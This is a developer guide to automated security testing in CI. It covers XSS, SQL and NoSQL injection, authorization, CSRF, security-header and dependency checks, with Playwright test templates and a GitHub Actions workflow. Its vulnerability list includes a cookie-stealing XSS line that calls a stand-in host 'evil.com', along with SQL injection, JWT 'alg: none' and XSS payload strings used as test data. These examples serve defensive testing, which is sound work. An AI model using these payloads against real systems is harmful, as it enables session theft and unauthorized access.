# Security Tests

## What It Is

Security testing systematically verifies that your application resists known attack vectors, protects user data, and enforces authorization boundaries correctly. This is not a penetration test performed by external experts (though you should do that too) — this is automated, repeatable security verification that runs in your CI pipeline and catches the OWASP Top 10 vulnerabilities, authentication bypasses, authorization failures, injection attacks, and dependency vulnerabilities before they reach production. The goal is to make common attacks fail by default, every build.

---

## What It Catches

- **Stored XSS** — User submits `<script>document.cookie</script>` in a comment field, it renders unescaped for every viewer, stealing session tokens
- **Reflected XSS** — Attacker crafts URL `example.com/search?q=<script>fetch('evil.com/steal?c='+document.cookie)</script>` and sends it to victims
- **DOM-based XSS** — Client-side JS reads `location.hash` and injects it into `innerHTML` without sanitization
- **SQL injection** — Login form bypassed with `admin' OR '1'='1` in the password field because of string concatenation in queries
- **NoSQL injection** — MongoDB query manipulated with `{"$gt": ""}` in a JSON body field, returning all records instead of one
- **Broken authentication** — Password reset tokens that are sequential, never expire, or work for any account
- **Authorization bypass** — User A can access `/api/users/user-b-id/settings` by changing the ID in the URL because the backend only checks "is logged in" not "is this their data"
- **CSRF attacks** — State-changing POST request works without a CSRF token because the backend trusts the session cookie alone
- **Insecure direct object references (IDOR)** — Incrementing `/api/invoices/1042` to `/api/invoices/1043` returns another customer's invoice
- **Missing security headers** — No CSP header allows inline script execution, no HSTS header allows SSL stripping attacks
- **Dependency vulnerabilities** — A transitive dependency has a known RCE vulnerability that's been patched for 6 months but you haven't updated
- **Sensitive data exposure** — API error responses include stack traces, database connection strings, or internal IP addresses
- **Rate limiting gaps** — Login endpoint has no rate limit, allowing automated credential stuffing at 1,000 attempts/second
- **JWT manipulation** — Changing the `alg` header to `none` bypasses signature verification on a poorly configured library

---

## When It's Required

| Condition | Why |
|-----------|-----|
| Your app has user authentication | Auth is the #1 attack surface |
| You store any personal data (email, name, address) | Legal liability under GDPR, CCPA, etc. |
| You accept user input of any kind | Every input is a potential injection vector |
| You process payments or financial data | PCI-DSS compliance requires security testing |
| You have a public-facing API | Bots will find and test every endpoint |
| You use third-party dependencies | Supply chain attacks are the fastest-growing vector |
| You're in healthcare, finance, or government | Regulatory requirements mandate security testing |
| You have multi-tenant data | Tenant isolation failures are catastrophic |

**Skip when:** Truly static sites with zero user input, zero authentication, zero dynamic content. Even then, run dependency scanning and security header checks.

---

## Setup Guide

### Layer 1: Dependency Vulnerability Scanning

```bash
# Built into npm (run weekly minimum, block on critical/high)
npm audit

# More comprehensive: Snyk
npm install -g snyk
snyk auth
snyk test          # Check dependencies
snyk monitor       # Continuous monitoring

# GitHub Dependabot — enable in repo settings (free)
# Creates PRs automatically for vulnerable dependencies
```

### Layer 2: Static Application Security Testing (SAST)

```bash
# ESLint security rules
npm install -D eslint-plugin-security eslint-plugin-no-unsanitized

# Semgrep (pattern-based code scanning)
# Install: pip install semgrep (or use Docker)
# Run: semgrep --config=auto src/
```

### Layer 3: Dynamic Security Testing in E2E

Use Playwright for security-focused test scenarios that actually attack your running application.

```bash
# You already have Playwright from E2E tests
npm install -D @playwright/test
```

### Layer 4: Security Headers and HTTPS

```bash
# Test security headers
npm install -D helmet  # Middleware to set headers (Express)

# For Next.js, configure in next.config.js headers()
```

### Alternatives

| Tool | Best For | Notes |
|------|----------|-------|
| **npm audit / Snyk** | Dependency scanning | Run in CI, block on high/critical |
| **Semgrep** | SAST (source code patterns) | Free tier, custom rules, fast |
| **OWASP ZAP** | DAST (attack running app) | Full scanner, can be noisy |
| **Burp Suite** | Manual penetration testing | Professional tool, not for CI |
| **ESLint security plugin** | Catch common JS security mistakes | Low effort, catches obvious issues |
| **Playwright** | Custom security scenario tests | You already have it, test your specific attack surface |
| **tfsec / checkov** | Infrastructure-as-code scanning | Terraform, CloudFormation security |
| **Trivy** | Container image scanning | Find vulnerabilities in Docker images |

---

## Template

### XSS Prevention Tests (Playwright)

```ts
// tests/security/xss.spec.ts
import { test, expect } from '@playwright/test';

const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  'javascript:alert("xss")',
  '"><script>alert("xss")</script>',
  "'-alert('xss')-'",
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert("xss")>',
  '{{constructor.constructor("alert(1)")()}}',  // Template injection
  '${7*7}',  // Template literal injection
];

test.describe('XSS Prevention', () => {
  for (const payload of XSS_PAYLOADS) {
    test(`blocks XSS payload: ${payload.substring(0, 40)}...`, async ({ page }) => {
      // Test every user input field
      await page.goto('/items/new');

      await page.fill('[name="title"]', payload);
      await page.fill('[name="description"]', payload);
      await page.click('button[type="submit"]');

      // Wait for the item to be created and rendered
      await page.waitForURL(/\/items\/\d+/);

      // Verify the payload is escaped, not executed
      const pageContent = await page.content();
      expect(pageContent).not.toContain('<script>alert');
      expect(pageContent).not.toContain('onerror=alert');
      expect(pageContent).not.toContain('onload=alert');

      // Check that no dialog/alert was triggered
      // (Playwright auto-dismisses dialogs, but we can listen)
      let alertFired = false;
      page.on('dialog', () => { alertFired = true; });
      await page.reload();
      await page.waitForTimeout(1000);
      expect(alertFired).toBe(false);

      // Verify the text is displayed as literal text, not HTML
      const titleElement = await page.locator('.item-title');
      const titleText = await titleElement.textContent();
      expect(titleText).toContain(payload);  // Rendered as text, not as HTML
    });
  }
});
```

### Authorization Testing (Playwright)

```ts
// tests/security/authorization.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Authorization Boundaries', () => {
  let userAToken: string;
  let userBToken: string;
  let userAItemId: string;

  test.beforeAll(async ({ request }) => {
    // Create two separate users
    const resA = await request.post('/api/auth/login', {
      data: { email: 'user-a@test.com', password: 'password123' },
    });
    userAToken = (await resA.json()).token;

    const resB = await request.post('/api/auth/login', {
      data: { email: 'user-b@test.com', password: 'password123' },
    });
    userBToken = (await resB.json()).token;

    // User A creates an item
    const itemRes = await request.post('/api/items', {
      headers: { Authorization: `Bearer ${userAToken}` },
      data: { name: 'User A Private Item', content: 'Secret data' },
    });
    userAItemId = (await itemRes.json()).id;
  });

  test('User B cannot read User A\'s private item', async ({ request }) => {
    const res = await request.get(`/api/items/${userAItemId}`, {
      headers: { Authorization: `Bearer ${userBToken}` },
    });
    expect(res.status()).toBe(403);
  });

  test('User B cannot update User A\'s item', async ({ request }) => {
    const res = await request.put(`/api/items/${userAItemId}`, {
      headers: { Authorization: `Bearer ${userBToken}` },
      data: { name: 'Hacked by User B' },
    });
    expect(res.status()).toBe(403);
  });

  test('User B cannot delete User A\'s item', async ({ request }) => {
    const res = await request.delete(`/api/items/${userAItemId}`, {
      headers: { Authorization: `Bearer ${userBToken}` },
    });
    expect(res.status()).toBe(403);
  });

  test('Unauthenticated user cannot access protected endpoints', async ({ request }) => {
    const protectedEndpoints = [
      '/api/items',
      '/api/users/me',
      '/api/settings',
      '/api/billing',
    ];

    for (const endpoint of protectedEndpoints) {
      const res = await request.get(endpoint);
      expect(res.status()).toBe(401);
    }
  });

  test('Expired token is rejected', async ({ request }) => {
    // Use a known-expired JWT
    const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxMDAwMDAwMDAwfQ.invalid';
    const res = await request.get('/api/items', {
      headers: { Authorization: `Bearer ${expiredToken}` },
    });
    expect(res.status()).toBe(401);
  });

  test('IDOR: sequential ID enumeration returns 403, not 404', async ({ request }) => {
    // Try accessing items by incrementing IDs
    // A 404 means "doesn't exist" — an attacker learns valid ID ranges
    // A 403 means "exists but you can't access it" — still leaks existence
    // Best: return 404 for both "doesn't exist" AND "not authorized"
    for (let id = 1; id <= 20; id++) {
      const res = await request.get(`/api/items/${id}`, {
        headers: { Authorization: `Bearer ${userBToken}` },
      });
      // Should be either 200 (user B's own items) or 404 (everything else)
      // NEVER 500 or a data leak
      expect([200, 404]).toContain(res.status());
      if (res.status() === 200) {
        const body = await res.json();
        expect(body.ownerId).toBe('user-b-id');  // Only their own data
      }
    }
  });
});
```

### Security Headers Test

```ts
// tests/security/headers.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Security Headers', () => {
  test('all required security headers are present', async ({ request }) => {
    const res = await request.get('/');
    const headers = res.headers();

    // Content Security Policy
    expect(headers['content-security-policy']).toBeDefined();
    expect(headers['content-security-policy']).toContain("default-src 'self'");
    expect(headers['content-security-policy']).not.toContain("'unsafe-inline'");
    expect(headers['content-security-policy']).not.toContain("'unsafe-eval'");

    // Prevent clickjacking
    expect(headers['x-frame-options']).toBe('DENY');

    // Prevent MIME type sniffing
    expect(headers['x-content-type-options']).toBe('nosniff');

    // HTTPS enforcement
    expect(headers['strict-transport-security']).toBeDefined();
    expect(headers['strict-transport-security']).toContain('max-age=');

    // Referrer policy
    expect(headers['referrer-policy']).toBeDefined();

    // Permissions policy (restrict browser features)
    expect(headers['permissions-policy']).toBeDefined();
  });

  test('API responses do not leak server information', async ({ request }) => {
    const res = await request.get('/api/health');
    const headers = res.headers();

    // Should not expose server technology
    expect(headers['x-powered-by']).toBeUndefined();
    expect(headers['server']).not.toContain('Express');
    expect(headers['server']).not.toContain('nginx');
  });

  test('error responses do not leak internal details', async ({ request }) => {
    const res = await request.get('/api/nonexistent-endpoint');
    const body = await res.json();

    // Error response should not contain:
    expect(JSON.stringify(body)).not.toContain('node_modules');
    expect(JSON.stringify(body)).not.toContain('at Object.');
    expect(JSON.stringify(body)).not.toContain('stack');
    expect(JSON.stringify(body)).not.toContain('password');
    expect(JSON.stringify(body)).not.toContain('DATABASE_URL');
  });
});
```

### CSRF Protection Test

```ts
// tests/security/csrf.spec.ts
import { test, expect } from '@playwright/test';

test.describe('CSRF Protection', () => {
  test('state-changing requests without CSRF token are rejected', async ({ request }) => {
    // Login to get a valid session
    const loginRes = await request.post('/api/auth/login', {
      data: { email: 'test@test.com', password: 'password123' },
    });
    const { token } = await loginRes.json();

    // Attempt state-changing request WITHOUT CSRF token
    // (simulating a cross-origin form submission)
    const res = await request.post('/api/settings/email', {
      headers: {
        'Authorization': `Bearer ${token}`,
        // Deliberately omit CSRF token
        // Deliberately set origin to a different domain
        'Origin': 'https://evil-site.com',
      },
      data: { email: 'hacker@evil.com' },
    });

    expect(res.status()).toBe(403);
  });

  test('cookies have Secure, HttpOnly, and SameSite attributes', async ({ page }) => {
    await page.goto('/login');
    await page.fill('[name="email"]', 'test@test.com');
    await page.fill('[name="password"]', 'password123');
    await page.click('button[type="submit"]');
    await page.waitForURL('/dashboard');

    const cookies = await page.context().cookies();
    const sessionCookie = cookies.find(c => c.name === 'session' || c.name === 'token');

    if (sessionCookie) {
      expect(sessionCookie.httpOnly).toBe(true);    // Not accessible via JS
      expect(sessionCookie.secure).toBe(true);        // HTTPS only
      expect(sessionCookie.sameSite).toBe('Strict');   // Or 'Lax' minimum
    }
  });
});
```

### Dependency Scanning (CI Integration)

```yaml
# .github/workflows/security.yml
name: Security Scan
on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 6 * * 1'  # Weekly Monday 6 AM

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - run: npm ci

      - name: npm audit (block on high/critical)
        run: npm audit --audit-level=high

      - name: Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

  sast-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Semgrep SAST
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/nodejs
            p/react
            p/typescript

  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npx playwright install --with-deps
      - name: Start app
        run: npm run build && npm run start &
      - name: Wait for app
        run: npx wait-on http://localhost:3000 --timeout 30000
      - name: Run security tests
        run: npx playwright test tests/security/
```

### ESLint Security Rules

```js
// .eslintrc.js (add to existing config)
module.exports = {
  plugins: ['security', 'no-unsanitized'],
  extends: [
    'plugin:security/recommended',
    'plugin:no-unsanitized/DOM',
  ],
  rules: {
    'security/detect-object-injection': 'warn',
    'security/detect-non-literal-regexp': 'warn',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-possible-timing-attacks': 'warn',
    'no-unsanitized/method': 'error',
    'no-unsanitized/property': 'error',
  },
};
```

---

## Common Pitfalls

### 1. Testing only in isolation, not in composition
**Problem:** Your XSS sanitization works perfectly on the server, but the React component uses `dangerouslySetInnerHTML` to render the "sanitized" content, and a different code path bypasses the sanitizer entirely.
**Fix:** Test the full pipeline — submit malicious input through the actual form, then verify it renders safely on the actual page. Unit-test your sanitizer, but also E2E-test the real flow.

### 2. Hardcoding test credentials that match production
**Problem:** Your security tests use `admin@company.com` / `Password123!` — the same credentials someone set on the staging environment, which accidentally mirrors production.
**Fix:** Use clearly fake test credentials generated in test setup. Never use emails that could be real. Seed test users in `beforeAll` and clean up in `afterAll`.

### 3. Relying solely on dependency scanning
**Problem:** npm audit shows 0 vulnerabilities, so you declare the app "secure." Meanwhile, your custom auth logic has a timing attack vulnerability and your file upload accepts SVGs with embedded JavaScript.
**Fix:** Dependency scanning is one layer. You need SAST (code pattern scanning), DAST (attack the running app), and custom security tests for your specific business logic.

### 4. Overly permissive CSP headers
**Problem:** Your Content-Security-Policy is `default-src *` because "the real one broke Google Analytics." This CSP does literally nothing.
**Fix:** Start strict (`default-src 'self'`) and add specific exceptions as needed. Use CSP reporting (`report-uri`) in report-only mode first to find violations without breaking the site.

### 5. Not testing the unhappy path of auth flows
**Problem:** You test that login works with correct credentials. You never test what happens with 1,000 failed login attempts, a manipulated JWT, or a token that was valid 5 minutes ago.
**Fix:** Explicitly test: rate limiting on login, token expiry, token manipulation, session invalidation after password change, concurrent session limits.

### 6. Security tests that are too slow for CI
**Problem:** Running OWASP ZAP full scan takes 45 minutes, so the team disables it and runs it "monthly" (which means never).
**Fix:** Use a tiered approach. Fast tests (header checks, auth boundary tests, dependency scan) run on every PR. Full DAST scans run on a weekly schedule or before releases.

### 7. Ignoring npm audit because of false positives
**Problem:** npm audit reports 47 vulnerabilities, 43 of which are in devDependencies or unused code paths. The team ignores all of them, including the 4 real ones.
**Fix:** Use `npm audit --omit=dev` for production dependency scanning. Use Snyk's reachability analysis to filter out vulnerabilities in code paths your app never executes.

---

## Proof Artifact

A security test pass produces these artifacts:

### npm audit output
```
found 0 vulnerabilities
```

### Semgrep output
```
Ran 847 rules on 124 files
  0 findings (0 errors, 0 warnings)
```

### Playwright security test output
```
Running 28 tests using 4 workers
  ✓ XSS Prevention › blocks XSS payload: <script>alert("xss")</scr... (1.2s)
  ✓ XSS Prevention › blocks XSS payload: <img src=x onerror=alert... (1.1s)
  ✓ XSS Prevention › blocks XSS payload: <svg onload=alert("xss"... (0.9s)
  ...
  ✓ Authorization › User B cannot read User A's private item (0.3s)
  ✓ Authorization › User B cannot update User A's item (0.2s)
  ✓ Authorization › User B cannot delete User A's item (0.2s)
  ✓ Authorization › Unauthenticated user cannot access protected endpoints (0.4s)
  ✓ Authorization › IDOR: sequential ID enumeration returns 403 (0.6s)
  ✓ Security Headers › all required security headers are present (0.1s)
  ✓ Security Headers › API responses do not leak server information (0.1s)
  ✓ CSRF Protection › state-changing requests without CSRF token rejected (0.3s)
  ✓ CSRF Protection › cookies have Secure, HttpOnly, SameSite (0.5s)

  28 passed (14.2s)
```

### What constitutes a pass:
1. **npm audit** (or Snyk) reports zero high/critical vulnerabilities in production dependencies
2. **Semgrep** reports zero findings on OWASP Top 10 rules
3. **Playwright security suite** — all tests pass (XSS, auth boundaries, headers, CSRF)
4. **ESLint security plugin** — zero errors (warnings tracked but non-blocking)
5. **CI workflow** completes with exit code 0 on all three jobs (dependency-scan, sast-scan, security-tests)
